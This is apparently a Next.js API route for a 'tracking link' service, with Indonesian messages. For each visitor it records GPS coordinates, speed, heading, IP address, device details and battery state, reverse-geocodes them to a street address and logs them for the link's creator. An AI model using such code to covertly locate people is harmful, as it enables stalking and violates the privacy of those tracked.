import { NextResponse } from 'next/server';
import { store, reverseGeocode, parseUserAgent } from '@/lib/store';

export async function POST(request, { params }) {
  try {
    const { id } = await params;
    const body = await request.json();

    const {
      latitude,
      longitude,
      accuracy,
      altitude,
      altitudeAccuracy,
      heading,
      speed,
      screenResolution,
      battery,
      connectionType
    } = body;

    if (latitude === undefined || longitude === undefined) {
      return NextResponse.json({ success: false, message: 'Koordinat latitude dan longitude wajib diisi' }, { status: 400 });
    }

    const lat = parseFloat(latitude);
    const lng = parseFloat(longitude);
    const acc = parseFloat(accuracy || 0);

    const link = store.getLinkById(id);

    // IP Extraction
    const forwarded = request.headers.get('x-forwarded-for');
    const realIp = request.headers.get('x-real-ip');
    let ip = forwarded ? forwarded.split(',')[0].trim() : (realIp || '127.0.0.1');
    if (ip === '::1' || ip === '127.0.0.1') ip = '127.0.0.1 (Localhost)';

    // Device parsing
    const userAgent = request.headers.get('user-agent') || '';
    const deviceInfo = parseUserAgent(userAgent);

    // Reverse Geocode to street / district / city
    const geoDetails = await reverseGeocode(lat, lng);

    const logEntry = {
      linkId: link ? link.id : id,
      linkTitle: link ? link.title : 'Link Pelacak',
      preset: link ? link.preset : 'maps',
      coordinates: {
        latitude: lat,
        longitude: lng,
        accuracy: acc,
        altitude: altitude !== null ? altitude : null,
        altitudeAccuracy: altitudeAccuracy !== null ? altitudeAccuracy : null,
        heading: heading !== null ? heading : null,
        speed: speed !== null ? speed : null
      },
      address: geoDetails,
      device: {
        userAgent,
        ...deviceInfo,
        screenResolution: screenResolution || 'Unknown',
        battery: battery || null,
        connectionType: connectionType || 'Unknown'
      },
      ip,
      googleMapsUrl: `https://www.google.com/maps?q=${lat},${lng}`
    };

    const savedLog = store.addLog(logEntry);

    return NextResponse.json({
      success: true,
      message: 'Lokasi berhasil dicatat dan diproses',
      logId: savedLog.id,
      address: geoDetails
    });
  } catch (error) {
    console.error('Track error:', error);
    return NextResponse.json({ success: false, message: 'Gagal memproses data lokasi' }, { status: 500 });
  }
}
